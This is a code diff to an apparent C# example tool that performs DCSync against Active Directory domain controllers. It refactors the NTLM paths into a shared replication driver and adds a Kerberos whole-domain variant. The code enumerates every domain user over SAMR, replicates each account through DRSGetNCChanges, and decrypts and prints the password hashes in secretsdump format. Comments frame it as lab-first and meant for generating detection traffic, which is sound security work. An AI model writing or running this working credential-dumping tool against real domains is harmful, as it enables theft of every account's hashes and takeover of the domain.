@@ -15,12 +15,16 @@ namespace DotNetPacket.Examples;
 /// Lab-first and detection-focused. DCSync's wire tell — a DRSGetNCChanges carrying
 /// ulExtendedOp = EXOP_REPL_OBJ from a source IP that is not a domain controller — is a classic
 /// behavioral detection; this command exists so the SOC can generate and study that traffic.
+/// The four commands (NTLM/Kerberos × single/whole-domain) share one DRS replication driver so the
+/// only thing that varies on the wire is the authentication leg of the bind.
 /// </remarks>
 internal static class DcSync
 {
+    // ----- single account, NTLM auth -------------------------------------------------------------
+
     public static int Run(string[] args)
     {
-        if (args.Length < 5)
+        if (args.Length < 6)
         {
             Console.Error.WriteLine(
                 "usage: dcsync <dc-host> <user> <password> <domain-fqdn> <target-user> [netbios-domain] [epm-port]");
@@ -35,26 +39,15 @@ internal static class DcSync
         string netbios = args.Length >= 7 ? args[6] : domainFqdn.Split('.')[0].ToUpperInvariant();
         int epmPort = args.Length >= 8 ? int.Parse(args[7]) : 135;
 
-        // 1) Resolve drsuapi's dynamic TCP port via the endpoint mapper.
-        DcerpcPipe mapper = DcerpcPipe.OverTcp(host, epmPort);
-        if (!mapper.Bind(DcerpcInterface.Epm).Accepted)
+        int port = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
+        if (port < 0)
         {
-            Console.Error.WriteLine("Bind to endpoint mapper rejected.");
             return 1;
         }
 
-        EpmMapResult? mapped = Epm.MapTcp(mapper, DcerpcInterface.Drsuapi);
-        mapper.Close();
-        if (mapped is null)
-        {
-            Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for drsuapi.");
-            return 1;
-        }
+        Console.WriteLine($"drsuapi endpoint on {host}:{port}  (resolved via ept_map)");
 
-        Console.WriteLine($"drsuapi endpoint on {host}: {mapped}  (resolved via ept_map)");
-
-        // 2) Connect and bind drsuapi with NTLMSSP packet privacy (sign+seal).
-        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, mapped.Port);
+        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, port);
         DcerpcBindAck ack = pipe.BindAuthenticated(
             DcerpcInterface.Drsuapi, netbios, user, password, DcerpcAuthLevel.PacketPrivacy);
         if (!ack.Accepted)
@@ -63,57 +56,10 @@ internal static class DcSync
             return 1;
         }
 
-        byte[]? sessionKey = pipe.SessionKey;
-        if (sessionKey is null)
-        {
-            Console.Error.WriteLine("No DCERPC session key after bind (cannot decrypt secrets).");
-            return 1;
-        }
-
-        // 3) IDL_DRSBind — establish the replication handle; honour the DC's dwReplEpoch.
-        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(
-            pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
-        if (bind.ReplEpoch != 0)
-        {
-            bind = Drsuapi.ParseBindResponse(
-                pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
-        }
-
-        Console.WriteLine($"DRSBind ok — DRS_HANDLE {Convert.ToHexString(bind.Handle)[..16]}… replEpoch {bind.ReplEpoch}");
-
-        // 4) IDL_DRSDomainControllerInfo (level 2) — the DC's own NtdsDsaObjectGuid for the req header.
-        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
-            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo,
-                Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
-        Console.WriteLine($"DRSDomainControllerInfo ok — NtdsDsaObjectGuid {ntdsDsaGuid}");
-
-        // 5) IDL_DRSCrackNames — resolve the NT4 account name to its objectGUID.
-        string nt4 = $"{netbios}\\{targetUser}";
-        Drsuapi.CrackedName cracked = Drsuapi.ParseCrackNamesResponse(
-            pipe.Call(Drsuapi.OpnumDrsCrackNames,
-                Drsuapi.BuildCrackNamesStub(bind.Handle, Drsuapi.DsNt4AccountName, Drsuapi.DsUniqueIdName, nt4)));
-        if (cracked.Status != 0 || string.IsNullOrEmpty(cracked.Name))
-        {
-            Console.Error.WriteLine($"DRSCrackNames failed for {nt4} (status {cracked.Status}).");
-            return 1;
-        }
-
-        Guid targetGuid = Guid.Parse(cracked.Name.Trim('{', '}'));
-        Console.WriteLine($"DRSCrackNames ok — {nt4} -> {targetGuid}");
-
-        // 6) IDL_DRSGetNCChanges (EXOP_REPL_OBJ) — replicate the single object.
-        Console.WriteLine("DRSGetNCChanges (EXOP_REPL_OBJ) — the DCSync replication request…");
-        byte[] getNcStub = Drsuapi.BuildGetNCChangesStub(bind.Handle, ntdsDsaGuid, targetGuid);
-        DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
-            pipe.Call(Drsuapi.OpnumDrsGetNcChanges, getNcStub));
-
-        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
-        pipe.Close();
-
-        // 7) Decrypt and print the secrets in secretsdump format: domain\user:rid:lm:nt:::
-        PrintSecrets(obj, sessionKey, targetUser);
-        return 0;
+        return DcSyncSingle(pipe, domainFqdn, netbios, targetUser);
     }
+
+    // ----- whole domain, NTLM auth ---------------------------------------------------------------
 
     /// <summary>
     /// dcsync-all: enumerate the domain's user accounts over SAMR, then DCSync each one by SID
@@ -137,123 +83,47 @@ internal static class DcSync
         string netbios = args.Length >= 6 ? args[5] : domainFqdn.Split('.')[0].ToUpperInvariant();
         int epmPort = args.Length >= 7 ? int.Parse(args[6]) : 135;
 
-        // 1) Enumerate the domain's users (RID + name) and the domain SID over sealed SAMR.
-        SamrSid? domainSid;
-        List<SamrRidEntry> users;
+        // 1) Enumerate the domain's users (RID + name) and the domain SID over sealed SAMR (NTLM).
+        int samrPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Samr, "samr");
+        if (samrPort < 0)
         {
-            DcerpcPipe samrMapper = DcerpcPipe.OverTcp(host, epmPort);
-            if (!samrMapper.Bind(DcerpcInterface.Epm).Accepted)
-            {
-                Console.Error.WriteLine("Bind to endpoint mapper rejected.");
-                return 1;
-            }
-
-            EpmMapResult? samrEndpoint = Epm.MapTcp(samrMapper, DcerpcInterface.Samr);
-            samrMapper.Close();
-            if (samrEndpoint is null)
-            {
-                Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for samr.");
-                return 1;
-            }
-
-            DcerpcPipe samr = DcerpcPipe.OverTcp(host, samrEndpoint.Port);
-            if (!samr.BindAuthenticated(DcerpcInterface.Samr, netbios, user, password, DcerpcAuthLevel.PacketPrivacy).Accepted)
-            {
-                Console.Error.WriteLine("Authenticated samr bind rejected.");
-                return 1;
-            }
-
-            SamrHandleResult server = Samr.Connect(samr);
-            SamrEnumResult domains = Samr.EnumerateDomains(samr, server.Handle);
-            string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
-            (domainSid, _) = Samr.LookupDomain(samr, server.Handle, accountDomain);
-            if (domainSid is null)
-            {
-                Console.Error.WriteLine($"Could not resolve the domain SID for {accountDomain}.");
-                return 1;
-            }
-
-            SamrHandleResult dom = Samr.OpenDomain(samr, server.Handle, domainSid);
-            users = Samr.EnumerateUsers(samr, dom.Handle).Entries.ToList();
-            Samr.CloseHandle(samr, dom.Handle);
-            Samr.CloseHandle(samr, server.Handle);
-            samr.Close();
-        }
-
-        Console.WriteLine($"Enumerated {users.Count} user(s) in {netbios} (domain SID {domainSid}).");
-
-        // 2) Bind DRSUAPI and establish the replication handle.
-        DcerpcPipe drsMapper = DcerpcPipe.OverTcp(host, epmPort);
-        drsMapper.Bind(DcerpcInterface.Epm);
-        EpmMapResult? drsEndpoint = Epm.MapTcp(drsMapper, DcerpcInterface.Drsuapi);
-        drsMapper.Close();
-        if (drsEndpoint is null)
-        {
-            Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for drsuapi.");
             return 1;
         }
 
-        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, drsEndpoint.Port);
+        DcerpcPipe samr = DcerpcPipe.OverTcp(host, samrPort);
+        if (!samr.BindAuthenticated(DcerpcInterface.Samr, netbios, user, password, DcerpcAuthLevel.PacketPrivacy).Accepted)
+        {
+            Console.Error.WriteLine("Authenticated samr bind rejected.");
+            return 1;
+        }
+
+        (SamrSid domainSid, List<SamrRidEntry> users)? enumerated = EnumerateDomainUsers(samr);
+        samr.Close();
+        if (enumerated is not { } e)
+        {
+            return 1;
+        }
+
+        Console.WriteLine($"Enumerated {e.users.Count} user(s) in {netbios} (domain SID {e.domainSid}).");
+
+        // 2) Bind DRSUAPI (NTLM) and replicate each account by SID.
+        int drsPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
+        if (drsPort < 0)
+        {
+            return 1;
+        }
+
+        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, drsPort);
         if (!pipe.BindAuthenticated(DcerpcInterface.Drsuapi, netbios, user, password, DcerpcAuthLevel.PacketPrivacy).Accepted)
         {
             Console.Error.WriteLine("Authenticated drsuapi bind rejected.");
             return 1;
         }
 
-        byte[]? sessionKey = pipe.SessionKey;
-        if (sessionKey is null)
-        {
-            Console.Error.WriteLine("No DCERPC session key after bind.");
-            return 1;
-        }
-
-        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
-        if (bind.ReplEpoch != 0)
-        {
-            bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
-        }
-
-        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
-            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo, Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
-
-        Console.WriteLine($"DRSBind ok — replicating {users.Count} account(s) by SID (EXOP_REPL_OBJ)…");
-        Console.WriteLine();
-
-        // 3) Replicate each account by SID and print its secrets.
-        foreach (SamrRidEntry u in users)
-        {
-            byte[] packedSid = PackSid(domainSid, u.Rid);
-            try
-            {
-                DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
-                    pipe.Call(Drsuapi.OpnumDrsGetNcChanges,
-                        Drsuapi.BuildGetNCChangesStubBySid(bind.Handle, ntdsDsaGuid, packedSid)));
-                PrintSecrets(obj, sessionKey, u.Name);
-            }
-            catch (Exception ex)
-            {
-                Console.Error.WriteLine($"  [!] {u.Name} (RID {u.Rid}) failed: {ex.Message}");
-            }
-        }
-
-        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
-        pipe.Close();
-        return 0;
+        return DcSyncWholeDomain(pipe, domainFqdn, e.domainSid, e.users);
     }
 
-    /// <summary>Packs a domain SID + RID into the 28-byte NT4SID a DSNAME carries.</summary>
-    private static byte[] PackSid(SamrSid domainSid, uint rid)
-    {
-        uint[] subs = domainSid.SubAuthorities.Append(rid).ToArray();
-        var w = new List<byte> { domainSid.Revision, (byte)subs.Length };
-        w.AddRange(domainSid.IdentifierAuthority);
-        foreach (uint s in subs)
-        {
-            w.AddRange(BitConverter.GetBytes(s));
-        }
-
-        return w.ToArray();
-    }
+    // ----- single account, Kerberos auth ---------------------------------------------------------
 
     /// <summary>
     /// dcsync with Kerberos (-k): authenticate the DRSUAPI bind with a Kerberos ticket (DCE-style
@@ -277,23 +147,16 @@ internal static class DcSync
         string netbios = args.Length >= 8 ? args[7] : domainFqdn.Split('.')[0].ToUpperInvariant();
         int epmPort = args.Length >= 9 ? int.Parse(args[8]) : 135;
 
-        // 1) Get a service ticket for host/<dc-fqdn> (AES) via the KDC.
-        ServiceTicket ticket = KerberosClient.GetServiceTicketForSpn(
-            host, domainFqdn.ToUpperInvariant(), user, password, null, null, $"host/{dcFqdn}");
+        ServiceTicket ticket = ServiceTicketForDc(host, domainFqdn, user, password, dcFqdn);
         Console.WriteLine($"Service ticket for host/{dcFqdn} (etype {ticket.SessionKeyEtype}).");
 
-        // 2) Resolve drsuapi's dynamic port and bind it with Kerberos (DCE-style GSS seal).
-        DcerpcPipe mapper = DcerpcPipe.OverTcp(host, epmPort);
-        mapper.Bind(DcerpcInterface.Epm);
-        EpmMapResult? mapped = Epm.MapTcp(mapper, DcerpcInterface.Drsuapi);
-        mapper.Close();
-        if (mapped is null)
+        int port = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
+        if (port < 0)
         {
-            Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for drsuapi.");
             return 1;
         }
 
-        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, mapped.Port);
+        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, port);
         DcerpcBindAck ack = pipe.BindKerberos(DcerpcInterface.Drsuapi, ticket, DcerpcAuthLevel.PacketPrivacy);
         if (!ack.Accepted)
         {
@@ -301,24 +164,92 @@ internal static class DcSync
             return 1;
         }
 
-        byte[]? sessionKey = pipe.SessionKey;
-        if (sessionKey is null)
+        Console.WriteLine("Kerberos DRSUAPI bind accepted (DCE-style, sealed).");
+        return DcSyncSingle(pipe, domainFqdn, netbios, targetUser);
+    }
+
+    // ----- whole domain, Kerberos auth -----------------------------------------------------------
+
+    /// <summary>
+    /// dcsync-all-k: whole-domain DCSync over Kerberos. The same host/&lt;dc-fqdn&gt; service ticket
+    /// authenticates both the SAMR enumeration bind and the DRSUAPI replication bind (each bind builds
+    /// its own AP-REQ/authenticator from the reusable ticket). Lab-first, authorized use only.
+    /// </summary>
+    public static int RunAllKerberos(string[] args)
+    {
+        if (args.Length < 6)
         {
-            Console.Error.WriteLine("No Kerberos session key after bind.");
+            Console.Error.WriteLine(
+                "usage: dcsync-all-k <dc-host> <user> <password> <domain-fqdn> <dc-fqdn> [netbios-domain] [epm-port]");
+            return 2;
+        }
+
+        string host = args[1];
+        string user = args[2];
+        string password = args[3];
+        string domainFqdn = args[4];
+        string dcFqdn = args[5];
+        string netbios = args.Length >= 7 ? args[6] : domainFqdn.Split('.')[0].ToUpperInvariant();
+        int epmPort = args.Length >= 8 ? int.Parse(args[7]) : 135;
+
+        ServiceTicket ticket = ServiceTicketForDc(host, domainFqdn, user, password, dcFqdn);
+        Console.WriteLine($"Service ticket for host/{dcFqdn} (etype {ticket.SessionKeyEtype}).");
+
+        // 1) Enumerate the domain's users over a Kerberos-sealed SAMR bind.
+        int samrPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Samr, "samr");
+        if (samrPort < 0)
+        {
+            return 1;
+        }
+
+        DcerpcPipe samr = DcerpcPipe.OverTcp(host, samrPort);
+        if (!samr.BindKerberos(DcerpcInterface.Samr, ticket, DcerpcAuthLevel.PacketPrivacy).Accepted)
+        {
+            Console.Error.WriteLine("Kerberos samr bind rejected.");
+            return 1;
+        }
+
+        Console.WriteLine("Kerberos SAMR bind accepted (DCE-style, sealed).");
+        (SamrSid domainSid, List<SamrRidEntry> users)? enumerated = EnumerateDomainUsers(samr);
+        samr.Close();
+        if (enumerated is not { } e)
+        {
+            return 1;
+        }
+
+        Console.WriteLine($"Enumerated {e.users.Count} user(s) in {netbios} (domain SID {e.domainSid}).");
+
+        // 2) Replicate each account by SID over a Kerberos-sealed DRSUAPI bind.
+        int drsPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
+        if (drsPort < 0)
+        {
+            return 1;
+        }
+
+        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, drsPort);
+        if (!pipe.BindKerberos(DcerpcInterface.Drsuapi, ticket, DcerpcAuthLevel.PacketPrivacy).Accepted)
+        {
+            Console.Error.WriteLine("Kerberos drsuapi bind rejected.");
             return 1;
         }
 
         Console.WriteLine("Kerberos DRSUAPI bind accepted (DCE-style, sealed).");
+        return DcSyncWholeDomain(pipe, domainFqdn, e.domainSid, e.users);
+    }
 
-        // 3) Drive the DCSync replication exactly as the NTLM path does.
-        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
-        if (bind.ReplEpoch != 0)
+    // ----- shared DRS replication driver ---------------------------------------------------------
+
+    /// <summary>Replicate a single named account on an already-bound (sealed) DRSUAPI pipe.</summary>
+    private static int DcSyncSingle(DcerpcPipe pipe, string domainFqdn, string netbios, string targetUser)
+    {
+        byte[]? sessionKey = pipe.SessionKey;
+        if (sessionKey is null)
         {
-            bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
+            Console.Error.WriteLine("No DCERPC session key after bind (cannot decrypt secrets).");
+            return 1;
         }
 
-        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
-            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo, Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
+        (Drsuapi.BindResult bind, Guid ntdsDsaGuid) = OpenDrs(pipe, domainFqdn);
 
         string nt4 = $"{netbios}\\{targetUser}";
         Drsuapi.CrackedName cracked = Drsuapi.ParseCrackNamesResponse(
@@ -331,14 +262,138 @@ internal static class DcSync
         }
 
         Guid targetGuid = Guid.Parse(cracked.Name.Trim('{', '}'));
+        Console.WriteLine($"DRSCrackNames ok — {nt4} -> {targetGuid}");
+
+        Console.WriteLine("DRSGetNCChanges (EXOP_REPL_OBJ) — the DCSync replication request…");
         DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
-            pipe.Call(Drsuapi.OpnumDrsGetNcChanges, Drsuapi.BuildGetNCChangesStub(bind.Handle, ntdsDsaGuid, targetGuid)));
+            pipe.Call(Drsuapi.OpnumDrsGetNcChanges,
+                Drsuapi.BuildGetNCChangesStub(bind.Handle, ntdsDsaGuid, targetGuid)));
 
         pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
         pipe.Close();
 
         PrintSecrets(obj, sessionKey, targetUser);
         return 0;
+    }
+
+    /// <summary>Replicate every enumerated account by SID on an already-bound (sealed) DRSUAPI pipe.</summary>
+    private static int DcSyncWholeDomain(
+        DcerpcPipe pipe, string domainFqdn, SamrSid domainSid, List<SamrRidEntry> users)
+    {
+        byte[]? sessionKey = pipe.SessionKey;
+        if (sessionKey is null)
+        {
+            Console.Error.WriteLine("No DCERPC session key after bind.");
+            return 1;
+        }
+
+        (Drsuapi.BindResult bind, Guid ntdsDsaGuid) = OpenDrs(pipe, domainFqdn);
+
+        Console.WriteLine($"DRSBind ok — replicating {users.Count} account(s) by SID (EXOP_REPL_OBJ)…");
+        Console.WriteLine();
+
+        foreach (SamrRidEntry u in users)
+        {
+            byte[] packedSid = PackSid(domainSid, u.Rid);
+            try
+            {
+                DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
+                    pipe.Call(Drsuapi.OpnumDrsGetNcChanges,
+                        Drsuapi.BuildGetNCChangesStubBySid(bind.Handle, ntdsDsaGuid, packedSid)));
+                PrintSecrets(obj, sessionKey, u.Name);
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine($"  [!] {u.Name} (RID {u.Rid}) failed: {ex.Message}");
+            }
+        }
+
+        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
+        pipe.Close();
+        return 0;
+    }
+
+    /// <summary>IDL_DRSBind (honouring dwReplEpoch) + IDL_DRSDomainControllerInfo for the NtdsDsaGuid.</summary>
+    private static (Drsuapi.BindResult bind, Guid ntdsDsaGuid) OpenDrs(DcerpcPipe pipe, string domainFqdn)
+    {
+        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(
+            pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
+        if (bind.ReplEpoch != 0)
+        {
+            bind = Drsuapi.ParseBindResponse(
+                pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
+        }
+
+        Console.WriteLine($"DRSBind ok — DRS_HANDLE {Convert.ToHexString(bind.Handle)[..16]}… replEpoch {bind.ReplEpoch}");
+
+        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
+            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo,
+                Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
+        Console.WriteLine($"DRSDomainControllerInfo ok — NtdsDsaObjectGuid {ntdsDsaGuid}");
+        return (bind, ntdsDsaGuid);
+    }
+
+    /// <summary>Resolve an interface's dynamic ncacn_ip_tcp port via the endpoint mapper.</summary>
+    private static int ResolveEndpoint(string host, int epmPort, DcerpcInterface iface, string label)
+    {
+        DcerpcPipe mapper = DcerpcPipe.OverTcp(host, epmPort);
+        if (!mapper.Bind(DcerpcInterface.Epm).Accepted)
+        {
+            mapper.Close();
+            Console.Error.WriteLine("Bind to endpoint mapper rejected.");
+            return -1;
+        }
+
+        EpmMapResult? mapped = Epm.MapTcp(mapper, iface);
+        mapper.Close();
+        if (mapped is null)
+        {
+            Console.Error.WriteLine($"Endpoint mapper has no ncacn_ip_tcp binding for {label}.");
+            return -1;
+        }
+
+        return mapped.Port;
+    }
+
+    /// <summary>Enumerate the account domain's users (RID + name) and its SID over a bound SAMR pipe.</summary>
+    private static (SamrSid domainSid, List<SamrRidEntry> users)? EnumerateDomainUsers(DcerpcPipe samr)
+    {
+        SamrHandleResult server = Samr.Connect(samr);
+        SamrEnumResult domains = Samr.EnumerateDomains(samr, server.Handle);
+        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
+        (SamrSid? domainSid, _) = Samr.LookupDomain(samr, server.Handle, accountDomain);
+        if (domainSid is null)
+        {
+            Console.Error.WriteLine($"Could not resolve the domain SID for {accountDomain}.");
+            Samr.CloseHandle(samr, server.Handle);
+            return null;
+        }
+
+        SamrHandleResult dom = Samr.OpenDomain(samr, server.Handle, domainSid);
+        List<SamrRidEntry> users = Samr.EnumerateUsers(samr, dom.Handle).Entries.ToList();
+        Samr.CloseHandle(samr, dom.Handle);
+        Samr.CloseHandle(samr, server.Handle);
+        return (domainSid, users);
+    }
+
+    /// <summary>Get a reusable service ticket for host/&lt;dc-fqdn&gt; (honours a cached TGT / KRB5CCNAME).</summary>
+    private static ServiceTicket ServiceTicketForDc(
+        string host, string domainFqdn, string user, string password, string dcFqdn) =>
+        KerberosClient.GetServiceTicketForSpn(
+            host, domainFqdn.ToUpperInvariant(), user, password, null, null, $"host/{dcFqdn}");
+
+    /// <summary>Packs a domain SID + RID into the 28-byte NT4SID a DSNAME carries.</summary>
+    private static byte[] PackSid(SamrSid domainSid, uint rid)
+    {
+        uint[] subs = domainSid.SubAuthorities.Append(rid).ToArray();
+        var w = new List<byte> { domainSid.Revision, (byte)subs.Length };
+        w.AddRange(domainSid.IdentifierAuthority);
+        foreach (uint s in subs)
+        {
+            w.AddRange(BitConverter.GetBytes(s));
+        }
+
+        return w.ToArray();
     }
 
     private static void PrintSecrets(DrsReplicaObject obj, byte[] sessionKey, string fallbackName)
